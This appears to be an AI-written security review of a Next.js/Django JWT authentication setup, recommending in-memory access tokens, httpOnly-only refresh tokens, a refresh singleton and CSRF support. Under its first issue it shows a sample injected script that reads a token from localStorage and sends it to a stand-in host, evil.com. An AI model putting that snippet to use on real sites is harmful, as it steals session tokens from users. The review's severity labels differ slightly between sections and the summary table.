# Authentication Security Review

**Date:** 2025-11-11
**Reviewer:** Claude (AI Assistant)
**Codebase:** mixtape-release-frontend
**Focus:** Auth Provider, Axios Instance, Token Management

---

## Executive Summary

Your authentication setup uses Refine's auth provider pattern with JWT tokens (access + refresh) and httpOnly cookies. The architecture is **well-structured** with clear separation of concerns, but there are **critical security issues** related to token storage that should be addressed before production.

**Overall Security Rating:** ⚠️ **MODERATE RISK**

---

## Security Analysis

### ✅ Good Security Practices

#### 1. **httpOnly Refresh Tokens**
- ✅ `withCredentials: true` in axios config (`axiosInstance.ts:13`)
- ✅ Refresh tokens stored as httpOnly cookies (protected from XSS)
- ✅ Cookies sent automatically with requests

#### 2. **Token Expiry Validation**
- ✅ 30-second buffer before expiry (`utils.ts:30`)
- ✅ Prevents race conditions on token expiration
- ✅ Proactive refresh before actual expiry

#### 3. **Automatic Token Refresh**
- ✅ Axios interceptor handles 401 responses (`axiosInstance.ts:44-73`)
- ✅ Prevents unnecessary logouts
- ✅ Transparent to application code

#### 4. **Authorization Header Management**
- ✅ Request interceptor adds Bearer token (`axiosInstance.ts:17-28`)
- ✅ Properly updates on refresh
- ✅ Centralized in axios instance

---

## 🚨 Security Issues & Recommendations

### CRITICAL ISSUE #1: Access Token in localStorage

**Location:** `authProvider.ts:123-124`

**Current Code:**
```typescript
// authProvider.ts:123-124
safeSetLocalStorage("access_token", response.data.access);
safeSetLocalStorage("access_token_expiry", String(expiresAt));
```

**Risk Level:** 🔴 **HIGH**

**Problem:**
Access tokens in localStorage are vulnerable to XSS (Cross-Site Scripting) attacks. If an attacker injects JavaScript into your application (through a compromised dependency, CDN, or stored XSS), they can steal the token:

```javascript
// Attacker's injected script
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Impact:**
- 🔓 Session hijacking
- 🔓 Unauthorized API access
- 🔓 Data exfiltration

**Recommendation: Move to Memory-Only Storage**

Since your refresh token is already in an httpOnly cookie, you can use **memory-only storage** for access tokens:

#### Option A: In-Memory Storage (RECOMMENDED)

**File:** `src/providers/auth-provider/tokenStorage.ts` (NEW FILE)

```typescript
// src/providers/auth-provider/tokenStorage.ts

/**
 * In-memory token storage (XSS-safe)
 * Tokens are lost on page refresh, which is GOOD for security.
 * On page load, axios interceptor will get 401 and auto-refresh from httpOnly cookie.
 */

let accessTokenCache: string | null = null;
let accessTokenExpiry: number | null = null;

export const setAccessToken = (token: string, expiryTimestamp: number) => {
  accessTokenCache = token;
  accessTokenExpiry = expiryTimestamp;
  console.log("✅ Access token stored in memory (XSS-safe)");
};

export const getAccessToken = (): string | null => {
  if (!accessTokenCache || !accessTokenExpiry) {
    return null;
  }

  // Check expiry with 30-second buffer
  const bufferMs = 30 * 1000;
  if (Date.now() >= accessTokenExpiry - bufferMs) {
    console.log("⚠️ Access token expired");
    clearAccessToken();
    return null;
  }

  return accessTokenCache;
};

export const clearAccessToken = () => {
  accessTokenCache = null;
  accessTokenExpiry = null;
  console.log("🔸 Access token cleared from memory");
};

export const isTokenValid = (): boolean => {
  return getAccessToken() !== null;
};
```

**Update:** `axiosInstance.ts`

```typescript
// axiosInstance.ts
import { getAccessToken } from "./tokenStorage";

// Request interceptor
axiosInstance.interceptors.request.use(
  (config: InternalAxiosRequestConfig): InternalAxiosRequestConfig => {
    const token = getAccessToken(); // ✅ From memory, not localStorage
    if (token && config.headers) {
      config.headers["Authorization"] = `Bearer ${token}`;
    }
    return config;
  },
  (error: AxiosError) => Promise.reject(error)
);
```

**Update:** `authProvider.ts`

```typescript
// authProvider.ts
import { setAccessToken, clearAccessToken, getAccessToken } from "./tokenStorage";

// In login method:
login: async ({ identifier, password }: LoginFormProps) => {
  // ... existing validation ...

  // ✅ Store in memory instead of localStorage
  const expiresAt = response.data.access_expires * 1000;
  setAccessToken(response.data.access, expiresAt);

  // ❌ REMOVE localStorage storage
  // safeSetLocalStorage("access_token", response.data.access);
  // safeSetLocalStorage("access_token_expiry", String(expiresAt));

  // ... rest of login logic ...
}
```

**Benefits:**
- ✅ Immune to XSS token theft
- ✅ Automatic re-authentication on page refresh (via httpOnly refresh token)
- ✅ Simpler codebase (no localStorage cleanup needed)
- ✅ Aligns with security best practices

**Tradeoff:**
- ⚠️ Page refresh triggers re-authentication (1 API call to refresh token)
- This is **expected behavior** and actually improves security

---

#### Option B: Keep localStorage BUT Add CSP Headers

If you prefer to keep tokens in localStorage (not recommended), you MUST add strict Content Security Policy:

**File:** `next.config.js`

```javascript
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval' 'unsafe-inline'", // ⚠️ Adjust based on your needs
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' http://localhost:8010 https://api.yourdomain.com",
      "frame-ancestors 'none'",
    ].join('; ')
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

**Limitations:**
- ❌ CSP doesn't protect against compromised npm packages
- ❌ `'unsafe-eval'` and `'unsafe-inline'` weaken protection
- ❌ Still vulnerable if CSP is misconfigured

**Verdict:** **Option A (in-memory) is strongly recommended**

---

### CRITICAL ISSUE #2: Storing Refresh Token in localStorage

**Location:** `authProvider.ts:129-136`

**Current Code:**
```typescript
// authProvider.ts:129-136
if (response.data.refresh && typeof response.data.refresh === "string") {
  safeSetLocalStorage("refresh_token", response.data.refresh);
  if (response.data.refresh_expires) {
    const refreshExpiresAt = response.data.refresh_expires * 1000;
    safeSetLocalStorage("refresh_token_expiry", String(refreshExpiresAt));
  }
  console.log("✅ Refresh token stored");
}
```

**Risk Level:** 🔴 **HIGH**

**Problem:**
Your backend is sending the refresh token in **TWO places**:
1. **httpOnly cookie** (secure, XSS-proof)
2. **Response body JSON** (stored in localStorage, vulnerable to XSS)

This defeats the purpose of httpOnly cookies. If the refresh token is in localStorage, an attacker can steal it via XSS.

**Impact:**
- 🔓 Long-lived session hijacking (refresh tokens last 30 days)
- 🔓 Attacker can generate new access tokens indefinitely
- 🔓 Harder to revoke compromised sessions

**Recommendation:**

#### Frontend Fix: Remove localStorage Storage

```typescript
// authProvider.ts - REMOVE THIS ENTIRE BLOCK
// ❌ DELETE THIS:
// if (response.data.refresh && typeof response.data.refresh === "string") {
//   safeSetLocalStorage("refresh_token", response.data.refresh);
//   if (response.data.refresh_expires) {
//     const refreshExpiresAt = response.data.refresh_expires * 1000;
//     safeSetLocalStorage("refresh_token_expiry", String(refreshExpiresAt));
//   }
//   console.log("✅ Refresh token stored");
// }

// ✅ Refresh token is ONLY in httpOnly cookie, no frontend storage needed
console.log("✅ Refresh token stored in httpOnly cookie (backend-managed)");
```

#### Backend Fix: Don't Send Refresh Token in Response Body

**File:** `accounts/api/views.py` (Django backend)

**Current (INSECURE):**
```python
# ❌ DON'T DO THIS
return Response({
    "success": True,
    "access": str(access_token),
    "refresh": str(refresh_token),  # ❌ Exposes refresh token to JS
    "access_expires": access_exp,
    "refresh_expires": refresh_exp,
})
```

**Recommended (SECURE):**
```python
# ✅ DO THIS
response = Response({
    "success": True,
    "access": str(access_token),
    "access_expires": access_exp,
    # ❌ REMOVE refresh token from body
})

# ✅ Set refresh token as httpOnly cookie ONLY
response.set_cookie(
    key=settings.JWT_COOKIE_NAME,
    value=str(refresh_token),
    httponly=True,
    secure=settings.JWT_COOKIE_SECURE,
    samesite=settings.JWT_COOKIE_SAMESITE,
    max_age=60 * 60 * 24 * 30,  # 30 days
)

return response
```

**Why This Matters:**

| Storage Method | XSS Vulnerable? | CSRF Vulnerable? | Recommended? |
|---------------|----------------|-----------------|--------------|
| localStorage | ✅ **YES** | ❌ No | ❌ **NO** |
| httpOnly Cookie | ❌ No | ✅ Yes* | ✅ **YES** |

*CSRF can be mitigated with SameSite cookies and CSRF tokens (which you should implement)

---

### MEDIUM ISSUE #3: Race Condition in Token Refresh

**Location:** `axiosInstance.ts:44-72`, `utils.ts:38-82`

**Risk Level:** 🟡 **MEDIUM**

**Problem:**
If multiple API requests fail with 401 simultaneously (e.g., page load with 10 concurrent requests), each one will trigger a separate token refresh:

```typescript
// axiosInstance.ts:44-48
if (error.response?.status === 401) {
  console.warn("[Axios Interceptor] 401 received. Attempting token refresh...");
  originalRequest._retry = true;
  const refreshed = await refreshToken(); // ⚠️ Multiple concurrent calls
  // ...
}
```

**Impact:**
- ⚠️ 10 concurrent requests = 10 refresh API calls
- ⚠️ Backend rate limiting may block legitimate refreshes
- ⚠️ Unnecessary load on backend
- ⚠️ Possible race conditions in token storage

**Recommendation: Singleton Pattern**

**File:** `utils.ts`

```typescript
// utils.ts

// ✅ Singleton to prevent concurrent refresh calls
let refreshPromise: Promise<TokenResponse | null> | null = null;

export const refreshToken = async (): Promise<TokenResponse | null> => {
  // ✅ If refresh is already in progress, return the existing promise
  if (refreshPromise) {
    console.log("🔄 Token refresh already in progress, awaiting existing request...");
    return refreshPromise;
  }

  // ✅ Create new refresh promise
  refreshPromise = (async () => {
    try {
      console.log("🔄 Starting token refresh...");

      const response = await fetch(REFRESH_TOKEN_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include", // Critical for httpOnly cookies
      });

      const data: TokenResponse = await response.json();

      // Handle backend's structured error response
      if (!response.ok || !data.success) {
        const errorCode = data.code || "unknown_error";
        const errorDetail = data.detail || "Token refresh failed";
        console.warn(`🔸 Token refresh failed [${errorCode}]:`, errorDetail);

        // Clear auth if terminal error
        if ([
          'user_not_found',
          'no_refresh_cookie',
          'invalid_refresh_token',
          'user_inactive'
        ].includes(errorCode)) {
          console.log("🔸 Clearing auth due to terminal error:", errorCode);
          clearAuthValues();
        }

        return null;
      }

      console.log("✅ Token refreshed successfully");
      return data;

    } catch (error) {
      console.error("🔸 Network error refreshing token:", error);
      return null;
    } finally {
      // ✅ Reset promise after completion (success or failure)
      refreshPromise = null;
    }
  })();

  return refreshPromise;
};
```

**How It Works:**
1. First 401 request → Creates `refreshPromise`, starts refresh
2. Next 9 concurrent 401s → Return same `refreshPromise` (await same result)
3. When refresh completes → All 10 requests use the new token
4. Reset `refreshPromise` to null for next refresh cycle

**Benefits:**
- ✅ Only 1 refresh API call per expiry cycle
- ✅ All concurrent requests share the same refresh result
- ✅ Prevents rate limiting issues
- ✅ Cleaner logs

---

### MEDIUM ISSUE #4: URL Construction Bug

**Location:** `authProvider.ts:27-29`, `utils.ts:7-10`

**Risk Level:** 🟡 **MEDIUM**

**Problem:**
Your URL construction doesn't match your Django backend routes.

**Current Code:**
```typescript
// authProvider.ts:27-29
const makeUrl = (endpoint: string): string => {
  return API_BASE + "/api/user" + endpoint;
};

// Usage in login:
const url = makeUrl("/token"); // → http://localhost:8010/api/user/token
```

**Your Backend Actually Uses:**
```python
# Django urls.py
urlpatterns = [
    path('api/auth/', include('accounts.api.auth_urls')),  # ✅ /api/auth/*
    path('api/members/', include('profiles.api.urls')),     # ✅ /api/members/*
]

# Actual endpoints:
# POST /api/auth/token          (login)
# POST /api/auth/token/refresh  (refresh)
# POST /api/auth/logout         (logout)
# GET  /api/auth/me             (identity)
```

**Impact:**
- ❌ All auth requests currently fail with 404
- ❌ Code appears to work in old environment but won't work with new backend

**Recommendation: Fix URL Construction**

#### Option A: Remove makeUrl Helper (RECOMMENDED)

```typescript
// authProvider.ts

const API_BASE = process.env.NEXT_PUBLIC_ROOT_API_URL;

// ✅ Define full URLs directly (clearer, less error-prone)
const LOGIN_URL = `${API_BASE}/api/auth/token`;
const LOGOUT_URL = `${API_BASE}/api/auth/logout`;
const ME_URL = `${API_BASE}/api/auth/me`;
const REFRESH_URL = `${API_BASE}/api/auth/token/refresh`;

// Usage in login:
login: async ({ identifier, password }: LoginFormProps) => {
  const response = await axiosInstance.post(LOGIN_URL, { identifier, password }, {
    withCredentials: true,
  });
  // ...
}
```

#### Option B: Fix makeUrl Helper

```typescript
// authProvider.ts
const makeAuthUrl = (endpoint: string): string => {
  return `${API_BASE}/api/auth${endpoint}`;
};

// Usage:
const url = makeAuthUrl("/token"); // → http://localhost:8010/api/auth/token
```

**Update utils.ts too:**

```typescript
// utils.ts:7-10
const API_BASE = process.env.NEXT_PUBLIC_ROOT_API_URL ?? "";

// ❌ OLD (wrong):
// const makeUrl = (endpoint: string): string => `${API_BASE}/api/user${endpoint}`;

// ✅ NEW (correct):
const REFRESH_TOKEN_URL = `${API_BASE}/api/auth/token/refresh`;
const LOGOUT_URL = `${API_BASE}/api/auth/logout`;
const ME_URL = `${API_BASE}/api/auth/me`;
```

---

### MEDIUM ISSUE #5: Auth Layout Fetches Identity on Unauthenticated Pages

**Location:** `app/(auth)/layout.tsx:24-25`

**Risk Level:** 🟡 **MEDIUM**

**Problem:**
The auth layout (used for `/login`, `/signup`, etc.) tries to fetch user identity:

```typescript
// app/(auth)/layout.tsx:24-25
const { data: identity, isLoading: identityLoading } = useGetIdentity<UserIdentity>();
const { isAdmin } = getRoleBooleans(identity);
```

**Impact:**
- ⚠️ API call fails on `/login` (user not authenticated yet)
- ⚠️ Console errors confuse developers
- ⚠️ Unnecessary API load
- ⚠️ Admin tools shouldn't appear on auth pages anyway

**Recommendation: Remove Identity Check**

```typescript
// app/(auth)/layout.tsx

export default function AuthLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const bgColor = useColorModeValue("background.light", "background.dark");
  const textColor = useColorModeValue("text.light", "text.dark");

  // ❌ REMOVE - users on /login aren't authenticated
  // const { data: identity } = useGetIdentity<UserIdentity>();
  // const { isAdmin } = getRoleBooleans(identity);

  return (
    <Box
      textStyle={'body'}
      minH={'100vh'}
      my={0}
      p={0}
      maxW="100%"
      mx={'auto'}
      bg={bgColor}
      color={textColor}
    >
      <Box pt={10} maxW={'5xl'} mx={'auto'}>
        {children}
      </Box>
      {/* ❌ REMOVE - No admin tools on auth pages */}
      {/* <AdminTodoButtonWithModal isAdmin={isAdmin} /> */}
    </Box>
  );
}
```

**Why:**
- ✅ Auth pages don't need user identity
- ✅ Admin tools don't belong on login/signup pages
- ✅ Reduces API calls and errors

---

### LOW ISSUE #6: Storage Event Spam

**Location:** `authProvider.ts:143-152`

**Risk Level:** 🟢 **LOW**

**Problem:**
Manual storage events can trigger cascading updates:

```typescript
// authProvider.ts:143-152
window.dispatchEvent(
  new StorageEvent("storage", {
    key: "access_token",
    oldValue: null,
    newValue: response.data.access,
    url: window.location.href,
  })
);
window.dispatchEvent(new Event("auth-update"));
```

**Impact:**
- ⚠️ If multiple tabs listen and trigger re-auth → cascading updates
- ⚠️ Event listeners may fire unnecessarily

**Recommendation: Only Emit if Changed**

```typescript
// authProvider.ts

// ✅ Only emit if token actually changed
const oldToken = safeGetLocalStorage("access_token");
if (oldToken !== response.data.access) {
  console.log("🔔 Token changed, emitting auth update event");
  window.dispatchEvent(new Event("auth-update"));
} else {
  console.log("🔕 Token unchanged, skipping event");
}
```

**Note:** If you move to in-memory storage (Issue #1), you can remove this entirely since other tabs won't share the token anyway.

---

### LOW ISSUE #7: Missing CSRF Protection

**Location:** N/A (not implemented)

**Risk Level:** 🟢 **LOW** (since you're using SameSite cookies)

**Problem:**
Your backend likely requires CSRF tokens for state-changing operations (POST, PUT, DELETE).

**Current Mitigation:**
- ✅ `SameSite=Lax` in dev settings (mitigates most CSRF)
- ✅ `SameSite=None` in prod (requires CSRF protection)

**Recommendation: Add CSRF Token Support**

**File:** `utils.ts`

```typescript
// utils.ts

const CSRF_URL = `${API_BASE}/api/csrf/`;

/**
 * Fetch CSRF token from backend and set as default axios header
 */
export const initializeCsrfProtection = async (): Promise<void> => {
  try {
    const response = await fetch(CSRF_URL, {
      method: "GET",
      credentials: "include",
    });

    const data = await response.json();
    const csrfToken = data.csrfToken;

    if (csrfToken) {
      // Set as default header for all axios requests
      axiosInstance.defaults.headers.common['X-CSRFToken'] = csrfToken;
      console.log("✅ CSRF token initialized");
    }
  } catch (error) {
    console.error("❌ Failed to fetch CSRF token:", error);
  }
};
```

**File:** `app/layout.tsx` or `providers.tsx`

```typescript
// Call on app initialization
useEffect(() => {
  if (typeof window !== 'undefined') {
    initializeCsrfProtection();
  }
}, []);
```

**Backend (Django):**

```python
# accounts/api/views.py

from django.middleware.csrf import get_token
from django.http import JsonResponse

def csrf(request):
    """Return CSRF token for frontend"""
    return JsonResponse({'csrfToken': get_token(request)})

# urls.py
urlpatterns = [
    path('api/csrf/', csrf),
    # ...
]
```

---

## Architecture Recommendations

### 1. Simplify Token Storage Strategy

**Current:** Access + refresh in localStorage + refresh in httpOnly cookie
**Recommended:** Access in memory + refresh ONLY in httpOnly cookie

```typescript
// Recommended token flow:

// 1. Login
POST /api/auth/token
→ Response: { success: true, access: "...", access_expires: 123456 }
→ Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Lax

// Frontend stores:
// - Access token: IN MEMORY (module variable)
// - Refresh token: IN COOKIE (httpOnly, managed by browser)

// 2. API request
GET /api/members/
→ Authorization: Bearer <access_token>

// 3. Page refresh (access token lost)
GET /api/members/
→ 401 Unauthorized (no access token in memory)
→ Auto-refresh via axios interceptor
POST /api/auth/token/refresh (sends httpOnly cookie automatically)
→ Response: { success: true, access: "...", access_expires: 123456 }
→ Store new access token in memory
→ Retry original request
```

**Benefits:**
- ✅ XSS-proof (tokens never in localStorage)
- ✅ Simple (no localStorage cleanup needed)
- ✅ Automatic recovery on page refresh
- ✅ Industry best practice

---

### 2. Recommended File Structure

```
src/
├── providers/
│   └── auth-provider/
│       ├── authProvider.ts       # Refine auth provider
│       ├── axiosInstance.ts      # Axios config + interceptors
│       ├── tokenStorage.ts       # ✅ NEW: In-memory token storage
│       └── utils.ts              # Auth utilities (refresh, logout, etc.)
│
├── app/
│   ├── (auth)/                   # Public auth routes
│   │   ├── login/
│   │   │   └── page.tsx
│   │   ├── signup/
│   │   │   └── page.tsx
│   │   └── layout.tsx            # ✅ FIXED: No identity check
│   │
│   └── (protected)/              # Protected routes
│       ├── dashboard/
│       └── layout.tsx            # ✅ Checks auth, fetches identity
│
└── components/
    └── providers.tsx             # ✅ Wraps app with Refine + auth
```

---

### 3. Update Root Providers

**File:** `components/providers.tsx`

```typescript
'use client';

import { ChakraProvider, defaultSystem } from '@chakra-ui/react';
import { Refine } from '@refinedev/core';
import authProvider from '@/providers/auth-provider/authProvider';
import { useEffect } from 'react';
import { initializeCsrfProtection } from '@/providers/auth-provider/utils';

export function Providers({ children }: { children: React.ReactNode }) {
  // Initialize CSRF token on app load
  useEffect(() => {
    initializeCsrfProtection();
  }, []);

  return (
    <ChakraProvider value={defaultSystem}>
      <Refine
        authProvider={authProvider}
        options={{
          syncWithLocation: true,
          warnWhenUnsavedChanges: true,
        }}
      >
        {children}
      </Refine>
    </ChakraProvider>
  );
}
```

---

## Implementation Priority

### Phase 1: Critical Security Fixes (DO IMMEDIATELY)

1. ✅ **Move access tokens to memory-only storage**
   - Create `tokenStorage.ts`
   - Update `authProvider.ts` login/logout
   - Update `axiosInstance.ts` request interceptor
   - Remove all `localStorage` access token references

2. ✅ **Remove refresh token from localStorage**
   - Remove refresh token storage in `authProvider.ts`
   - Update backend to NOT send refresh token in response body
   - Verify httpOnly cookie is set correctly

3. ✅ **Fix URL construction**
   - Update all `/api/user/*` to `/api/auth/*`
   - Verify endpoints match Django backend

### Phase 2: Stability Improvements (DO SOON)

4. ✅ **Add refresh token singleton**
   - Update `utils.ts` refreshToken function
   - Prevent race conditions

5. ✅ **Fix auth layout**
   - Remove identity check from `(auth)/layout.tsx`
   - Remove admin tools from auth pages

### Phase 3: Additional Hardening (DO BEFORE PRODUCTION)

6. ✅ **Add CSRF protection**
   - Create CSRF endpoint in Django
   - Initialize CSRF token on app load
   - Add `X-CSRFToken` header to axios

7. ✅ **Add security headers**
   - Content-Security-Policy
   - X-Frame-Options
   - X-Content-Type-Options

8. ✅ **Add rate limiting**
   - Backend rate limiting for auth endpoints
   - Frontend exponential backoff on failed auth

---

## Testing Checklist

After implementing fixes, verify:

### Security Tests

- [ ] Access token NOT in localStorage (check DevTools → Application → Local Storage)
- [ ] Refresh token NOT in localStorage
- [ ] Refresh token IS in cookies (check DevTools → Application → Cookies)
- [ ] Cookie has `HttpOnly` flag
- [ ] Cookie has `Secure` flag (in production)
- [ ] Cookie has `SameSite=Lax` or `SameSite=Strict`

### Functionality Tests

- [ ] Login works
- [ ] Access token stored in memory
- [ ] API requests include Authorization header
- [ ] Page refresh triggers auto-refresh (1 API call)
- [ ] Token auto-refreshes before expiry
- [ ] Logout clears tokens
- [ ] Logout invalidates httpOnly cookie
- [ ] Multiple concurrent 401s trigger only 1 refresh
- [ ] CSRF token included in POST requests

### UX Tests

- [ ] No console errors on login page
- [ ] No console errors on page refresh
- [ ] Admin tools don't appear on /login
- [ ] Smooth redirect after login
- [ ] No flashing/flickering on page load

---

## Summary of Changes Needed

| Priority | Issue | Impact | Effort | Fix |
|----------|-------|--------|--------|-----|
| 🔴 **CRITICAL** | Access tokens in localStorage | XSS vulnerability | Medium | Move to memory-only |
| 🔴 **CRITICAL** | URL construction wrong | All auth fails | Low | Fix `/api/user/*` → `/api/auth/*` |
| 🔴 **CRITICAL** | Refresh token in localStorage | Long-term hijacking | Low | Remove, use httpOnly only |
| 🟡 **HIGH** | Refresh token race condition | Performance, rate limiting | Low | Add singleton pattern |
| 🟡 **MEDIUM** | Auth layout fetches identity | Errors on /login | Low | Remove from auth pages |
| 🟢 **LOW** | Storage event spam | Minor performance | Low | Debounce or check changes |
| 🟢 **LOW** | Missing CSRF handling | CSRF attacks (mitigated by SameSite) | Medium | Add CSRF token support |

---

## Additional Resources

- [OWASP: Token Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0: Where to Store Tokens](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
- [Refine Auth Provider Docs](https://refine.dev/docs/core/providers/auth-provider/)
- [Django REST Framework JWT](https://django-rest-framework-simplejwt.readthedocs.io/)

---

**Questions or need help implementing these fixes?** Let me know!
